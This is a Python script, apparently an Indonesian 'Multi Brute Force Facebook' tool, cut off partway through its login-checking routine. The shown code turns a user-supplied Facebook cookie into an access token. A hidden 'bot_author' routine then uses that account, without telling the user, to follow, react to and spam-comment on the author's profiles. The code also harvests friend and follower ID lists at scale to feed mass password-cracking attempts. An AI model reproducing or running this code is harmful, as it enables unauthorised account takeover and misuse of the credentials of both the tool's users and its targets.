#!/usr/bin/python3
# -*- coding: utf-8 -*-
# kalau lu recode data hp lu yang hilang!!
Author    = 'Fikri Syahputra Sinaga'
Facebook = 'Facebook.com/fikri sinaga'
Instragram = 'Instragram.com/fikri.sinaga'
LicenseKey = '06 Hari'
Version = 'V.11'
Fikri  = 100080716718035
Postingan = 105432708823953

### IMPORT MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
##### BUAT WARNA >>>> X
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[1;95m"     # Ungu
I = "\x1b[1;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
### User Agent
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

### Akun Author Jangan Diganti Nanti Error !!!
_my_account_ = [
    '100004623370585','100000415317575','100000737201966','100020766075165','100000431996038','100026818103201','100001617352620',
    '100000729074466','607801156','100009340646547','1676993425','1767051257','100000287398094','100001085079906',
    '100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189']
    
##### BUAT IMPORT YG BELUM INSTALL AHAHHAA
try:
	import requests
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module futures belum terinstall")
	os.system("pip install futures")
#### BUAT BANNER
def banner():
    l1 = (' %s____  ____  _____ __  __ ___ _   _ __  __%s'%(K,H))
    l2 = ('%s|  _ \|  _ \| ____|  \/  |_ _| | | |  \/  |%s'%(H,K))
    l3 = ('%s| |_) | |_) |  _| | |\/| || || | | | |\/| |%s'%(K,H))
    l4 = ('%s|  __/|  _ <| |___| |  | || || |_| | |  | |%s'%(H,K))
    l5 = ('%s|_|   |_| \_\_____|_|  |_|___|\___/|_|  |_|%s'%(K,H))
    l6 = ('%s Multi Brute Force Facebook %s%s %sBy %sMhd Syafii     '%(H,K,Version,H,K))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))


###----------[ TIME ]---------- ###
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

### Host & Penampungan
host = "https://mbasic.facebook.com"
##### BUAT STR /LEN
id = []
ok = []
cp = []
loop=0

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.04)
### BUAT ANIMASI JALAN
def mlaku(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass
###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for i in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(i):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + i['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:
      return(username)
    
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('%s╠══[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %sTidak Dapat Mengeksekusi %s'%(M,A,M,A,M))
    print('%s╠══[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %sCookies/Token Invalid'%(M,A,M,A))
    print('%s╠══[%s•%s] %sSalah Memasukkan ID'%(M,A,M,A))
    print('%s╠══[%s•%s] %sBug Pada Source Code'%(M,A,M,A))
    print('%s╠══[%s•%s] %sBug Pada Requests'%(M,A,M,A))
    print('%s╠══[%s•%s] %sDan Lain-Lain'%(M,A,M,A))
    print('%s╠══[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
    print('%s╠══[%s•%s] %spython premium.py\n'%(M,A,M,A))
    exit()
    
###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Fikri)];self.komen = ['Abg Sayang🥰','Abg fikri Udh Punya Pacar😘','Kenalan Yuk Bang😁','Soalnya Sc Abg Keren😘😘']
        for i in list_id: self.get_folls(i,cookie); self.get_likers(f'https://mbasic.facebook.com/{i}?v=timeline',cookie); self.get_posts(i,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                    for i in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in i['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(i['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for i in bos.find_all('a',href=True):
                        if 'Tanggapi' in i.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(i['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for i in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+i['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(i['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(bot_follow(cookie))
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))
        
##### LOGIN COOKIE
def log_cookie():
    os.system("clear")
    banner()
    defaultua()
    mkdir_data_login()
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sJangan Gunakan Akun Pribadi%s!%s!%s'%(M,P,M,P,M,P,M))
    print('%s║'%(B))
    cookie = str(input('%s╠══[%s•%s] %sMasukkan Cookie : %s'%(P,K,P,K,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/token.json', 'w').write(token)
        open('login/cookie.json','w').write(cookie)
        bot_follow(cookie)
    except requests.exceptions.ConnectionError:
      print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
      print('%s║'%(M))
      print('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
      exit()
    except (KeyError,IOError,AttributeError):
      print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
      print('%s║'%(M))
      print('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()

### Bot Follow Jangan Diganti Anjink !
def bot_follow(cookie):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,cookie));time.sleep(0.3)
            except:pass
        print('%s║'%(B));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(K,P,K,P));time.sleep(2);menu()
    except:pass
    
    
###### BUAT MENU
def menu():
    global token,cookie
    resik()
    banner()
    try:
        token = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get  = requests.get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
        gt = requests.get('http://ipinfo.io/json').json()
        jso=json.loads(get.text)
        nama=jso['name']
        _id_=jso['id']
        link = jso['link']
        i = gt['ip']
        b = gt['region']
        c = gt['org']
        d = gt['timezone']
        e = gt['city']
    except (KeyError,IOError):
        print('%s╔══[ %sWaduh Bang %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));log_cookie()
    jalan('%s╔══[ %sSelamat Datang %s %s]'%(K,P,nama,K))
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sID : %s'%(K,P,K,P,_id_))
    print('%s╠══[%s•%s] %sIP : %s'%(K,P,K,P,i))
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sStatus : %sFree'%(K,P,K,P,A))
    print('%s╠══[%s•%s] %sVersi : %s'%(K,P,K,P,Version))
    print('%s╠══[%s•%s] %sTime Zone : %s'%(K,P,K,P,d))
    print('%s╠══[%s•%s] %sCity : %s'%(K,P,K,P,e))
    print('%s╠══[%s•%s] %sAuthor : %s'%(K,P,K,P,Author))
    print('%s╠══[%s•%s] %sUrl : %s'%(K,P,K,P,link))
    print('%s╠══[%s•%s] %sInfo Kuota : %s'%(K,P,K,P,c))
    print('%s╠══[%s•%s] %sPembelian : %sNull'%(K,P,K,P,A))
    print('%s╠══[%s•%s] %sRegion : %s'%(K,P,K,P,b))
    jalan('%s╠══[%s•%s] %sKedaluwarsa : %s'%(K,P,K,P,LicenseKey))
    print('%s║'%(B))
    jalan('%s╠══[%s01%s] %sCrack massal dari dump id publik'%(K,P,K,P))
    print('%s╠══[%s02%s] %sCrack dari dump id publik'%(K,P,K,P))
    print('%s╠══[%s03%s] %sCrack ID followers'%(K,P,K,P))
    print('%s╠══[%s04%s] %sCrack Dari Dump Id Pertemanan Sendiri'%(K,P,K,P))
    print('%s╠══[%s05%s] %sCek Opsi Hasil Crack'%(K,P,K,P))
    print('%s╠══[%s06%s] %sCek Hasil Crack'%(K,P,K,P))
    print('%s╠══[%s07%s] %sUser Agent'%(K,P,K,P))
    print('%s╠══[%s08%s] %sCek Membuat Scrip'%(K,P,K,P))
    print('%s╠══[%s00%s] %sLog Out'%(M,P,M,M))
    print('%s║'%(B))
    pm = input('%s╠══[%s••%s] %sPilih : '%(K,P,K,P))
    if pm in ['1','01','001','a']:
      massal()
    elif pm in ['2','02','002','b']:
      publik()
    elif pm in ['3','03','003','c']:
      listteman()
    elif pm in ['4','04','004','d']:
      followerss()
    elif pm in ['5','05','005','e']:
      cek_hasil()
    elif pm in ['6','06','006','f']:
      cek_results()
    elif pm in ['7','07','007','g']:
      ugen()
    elif pm in ['8','08','008','h']:
      membuat_sc()
    elif pm in ["0","00","000",'l']:
      print('%s║'%(B))
      jalan(f'{K}╚══[!] {M}Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!!{U}- Mhd Syafii -')
      print('%s║'%(B))
      jalan(f'{K}╚══[!] Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :{B}[•]{P}Token/Cookies')
      print('%s║'%(B))
      input('%s╚══[ %sTekan Enter Untuk Keluar%s]%s'%(M,P,M,P))
      try:shutil.rmtree('login')
      except:pass
      try:shutil.rmtree('ugen.json')
      except:pass
      exit()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()

def massal():
    try:
        token = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    try:
        print('%s║'%(B))
        print('%s╠══[%s•%s] %sMasukkan Berapa ID Yang Ingin Di crack'%(K,P,K,P))
        print('%s║'%(B))
        tanya_total = int(input("%s╠══[%s•%s] %sMasukkam Jumlah ID : "%(K,P,K,P)))
    except:tanya_total=1
    for t in range(tanya_total):
        t +=1
        print('%s║'%(B))
        _id_=input(f"%s╠══[%s•%s] %sMasukkan User ID {P}{t}  : {B}"%(K,P,K,P))
        try:
            url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
            z=json.loads(url.text)
            for i in z['friends']['data']:
                uid = i["id"]
                nama = i["name"]
                id.append(uid+"<=>"+nama)
        except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            print(f"{K}╠══[•] {U}User id tidak di temukan");menu()
    if len(id) == 0:
       print('%s║'%(B))
       print(f"{K}╠══[•]{M} Maaf total id anda adalah {B}{len(id)}");exit()
    else:
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)}{A}ID")
        fii_xd()
        
        
##### CRACK PERTEMANAN 
def listteman():
    try:
        token = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    try:
        url = requests.get("https://graph.facebook.com/me?fields=friends.limit(50000)&access_token=%s"%(token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            jalan(f"{K}╠══[•] {U}User id tidak di temukan");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)} {K}ID")
        fii_xd()
    else:print(f"{K}╠══[•]{M} Maaf total id : {B}{len(id)}");exit()
        
##### CRACK PUBLIK
def publik():
    try:
        token = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sKetik/Me/Untuk Dump ID Publik'%(K,P,K,P))
    _id_=input(f"{K}╠══[•] {P}Masukan user id : {B}")
    try:
        url= requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(_id_,token),cookies=cookie)
        z=json.loads(url.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            jalan(f"{K}╠══[•] {U}Maaf User ID Tidak Bersifat Publik");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)} {K}ID")
        fii_xd()
    else:print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)}{A}ID")
        
###### CRACK FOLLOWERS
def followerss():
    try:
        token = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except IOError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));exit()
    print('%s║'%(B))
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sKetik/Me/Untuk Dump ID Publik'%(K,P,K,P))
    _id_=input(f"{K}╠══[•] {P}Masukan user id : {B}")
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s"%(_id_,token),cookies=cookie).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
            print('%s║'%(B))
            print('%s║'%(B))
            jalan(f"{K}╠══[•] {U}Maaf User ID Tidak Bersifat Publik");menu()
    if len(id) !=0:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)} {K}ID")
        fii_xd()
    else:print(f"{K}╠══[•] {P}Berhasil Dump : {B}{len(id)}{A}ID")

##### PENGGANTI USER - UA
### User Agent Bawaan
def defaultua():
    ua = ua_xiaomi
    try:ua = open('ugent.json','w').write(ua)
    except (KeyError,IOError):login()
    
### Menu User Agent
def ugen():
    print("%s╠══[%s1%s] %sDapatkan User Agent"%(K,P,K,P))
    print("%s╠══[%s2%s] %sGanti User Agent %s(%sManual%s)"%(K,P,K,P,K,P,K))
    print("%s╠══[%s3%s] %sGanti User Agent %s(%sSesuaikan HP%s)"%(K,P,K,P,K,P,K))
    print("%s╠══[%s4%s] %sHapus User Agent"%(K,P,K,P))
    print("%s╠══[%s5%s] %sCek User Agent"%(K,P,K,P))
    print("%s╠══[%s0%s] %sKembali"%(K,P,K,P))
    pmu = input('%s╠══[%s•%s] %sPilih : '%(K,P,K,P))
    print('%s║'%(B))
    if pmu in[""]:
      jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pmu in ['1','01','001','a']:
      os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
      input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.json")
        ua = input("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(K,P,K,P))
        try:
          ua = open('ugent.json','w').write(ua)
          jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(K,P,K))
          print('%s║'%(B))
          input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
        except (KeyError,IOError):
          jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M))
          print('%s║'%(M))
          input('%s╚══[ %sKembali %s]%s'%(M,P,M,P));menu()
    elif pmu in ['3','03','003','c']:ugen_hp()
    elif pmu in ['4','04','004','d']:
      os.system("rm -rf ugent.json")
      jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(M,P,M))
      print('%s║'%(B))
      input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['5','05','005','e']:
        try:
          ua = open('ugent.json', 'r').read()
        except (KeyError,IOError):ungser = 'Tidak Ditemukan'
        print("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(K,P,K,P,K,ua))
        jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(K,P,K))
        print('%s║'%(B))
        input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    elif pmu in ['0','00','000','f']:
      menu()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.json")
    print('%s╠══[%s1%s] %sXiaomi'%(K,P,K,P))
    print('%s╠══[%s2%s] %sNokia'%(K,P,K,P))
    print('%s╠══[%s3%s] %sAsus'%(K,P,K,P))
    print('%s╠══[%s4%s] %sHuawei'%(K,P,K,P))
    print('%s╠══[%s5%s] %sVivo'%(K,P,K,P))
    print('%s╠══[%s6%s] %sOppo'%(K,P,K,P))
    print('%s╠══[%s7%s] %sSamsung'%(K,P,K,P))
    print('%s╠══[%s8%s] %sWindows'%(K,P,K,P))
    pc = input('%s╠══[%s•%s] %sPilih : '%(J,P,J,P))
    print('%s║'%(B))
    if pc in['']:
      jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pc in ['1','01']:ua = open('ugent.json','w').write(ua_xiaomi)
    elif pc in ['2','02']:ua = open('ugent.json','w').write(ua_nokia)
    elif pc in ['3','03']:ua = open('ugent.json','w').write(ua_asus)
    elif pc in ['4','04']:ua = open('ugent.json','w').write(ua_huawei)
    elif pc in ['5','05']:ua = open('ugent.json','w').write(ua_vivo)
    elif pc in ['6','06']:ua = open('ugent.json','w').write(ua_oppo)
    elif pc in ['7','07']:ua = open('ugent.json','w').write(ua_samsung)
    elif pc in ['8','08']:ua = open('ugent.json','w').write(ua_windows)
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(J,P,J))
    print('%s║'%(B))
    input('%s╚══[ %sKembali %s]%s'%(K,P,K,P));menu()
    
def membuat_sc():
    resik()
    banner()
    mlaku('%s║'%(B))
    mlaku('%s║'%(B))
    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(U,P,U))
    mlaku('%s║'%(B))
    mlaku('%s╠══[%s•%s] %sAuthor Paling ganteng😁:'%(U,P,U,P))
    mlaku('%s║     • %sMuhammad Syafii'%(U,P))
    mlaku('%s║     • %sFikri Syahputra Sinaga'%(U,P))
    mlaku('%s║     • %sDapunta Khurayra X'%(U,P))
    mlaku('%s║     • %sMuhamad Rizal Fiansyah Id'%(U,P))
    mlaku('%s║'%(B))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(U,P,U,P,U,P))
    mlaku('%s║     • %sAngga Kurniawan'%(U,P))
    mlaku('%s║     • %sYayan XD'%(U,P))
    mlaku('%s║     • %sBoy Hamzah'%(U,P))
    mlaku('%s║     • %sLatip Harkat'%(U,P))
    mlaku('%s║     • %sZacky Tricker'%(U,P))
    mlaku('%s║     • %sRizky Dev'%(U,P))
    mlaku('%s║     • %sIqbal Dev'%(U,P))
    mlaku('%s║     • %sFallen'%(U,P))
    mlaku('%s║     • %sHanifan'%(U,P))
    mlaku('%s║     • %sRizky Leviathan'%(U,P))
    mlaku('%s║'%(B))
    input('%s╚══[%s•%s] %s[%sTekan Enter Kembali%s]%s'%(K,P,K,P,K,P,K));menu()
    
#####LOGIN HASIL
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
